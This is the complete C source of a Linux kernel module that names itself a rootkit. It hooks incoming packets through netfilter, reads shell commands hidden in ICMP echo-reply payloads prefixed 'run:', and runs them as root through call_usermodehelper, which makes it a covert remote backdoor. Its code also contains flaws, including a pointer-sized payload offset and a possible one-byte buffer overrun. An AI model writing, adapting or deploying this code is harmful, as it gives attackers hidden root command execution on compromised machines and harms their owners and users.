#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>

#define MAX_CMD_LEN 1976

static struct nf_hook_ops nfho;

char cmd_string[MAX_CMD_LEN];

struct work_struct my_work;

static void work_handler(struct work_struct * work)
{
  static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
  static char *envp[] = {"PATH=/bin:/sbin", NULL};

  printk(KERN_INFO "rootkit: working\n");

  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

DECLARE_WORK(my_work, work_handler);

static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
  struct iphdr *iph;
  struct icmphdr *icmph;

  unsigned char *user_data;
  unsigned char *tail;
  unsigned char *i;
  int j = 0;

  iph = ip_hdr(skb);
  icmph = icmp_hdr(skb);

  printk(KERN_INFO "rootkit: ckecking connection\n");


  if (iph->protocol != IPPROTO_ICMP) {
    printk(KERN_INFO "rootkit: bad protocol\n");
    return NF_ACCEPT;
  }
  if (icmph->type != ICMP_ECHOREPLY) {
    printk(KERN_INFO "rootkit: bad request type\n");
    return NF_ACCEPT;
  }

  printk(KERN_INFO "rootkit: parsing command\n");

  user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
  tail = skb_tail_pointer(skb);

  j = 0;
  for (i = user_data; i != tail; ++i) {
    char c = *(char *)i;

    cmd_string[j] = c;

    j++;

    if (c == '\0')
      break;

    if (j == MAX_CMD_LEN) {
      cmd_string[j] = '\0';
      break;
    }

  }

  if (strncmp(cmd_string, "run:", 4) != 0) {
    return NF_ACCEPT;
  } else {
    for (j = 0; j <= sizeof(cmd_string)/sizeof(cmd_string[0])-4; j++) {
      cmd_string[j] = cmd_string[j+4];
      if (cmd_string[j] == '\0')
	break;
    }
  }

  printk(KERN_INFO "rootkit: command: %s \n", cmd_string);

  schedule_work(&my_work);

  return NF_ACCEPT;
}

static int __init startup(void)
{
  nfho.hook = icmp_cmd_executor;
  nfho.hooknum = NF_INET_PRE_ROUTING;
  nfho.pf = PF_INET;
  nfho.priority = NF_IP_PRI_FIRST;
  nf_register_net_hook(&init_net, &nfho);
  printk(KERN_INFO "rootkit: started\n");
  return 0;
}

static void __exit cleanup(void)
{
  nf_unregister_net_hook(&init_net, &nfho);
  printk(KERN_INFO "rootkit: finished\n");
}

MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);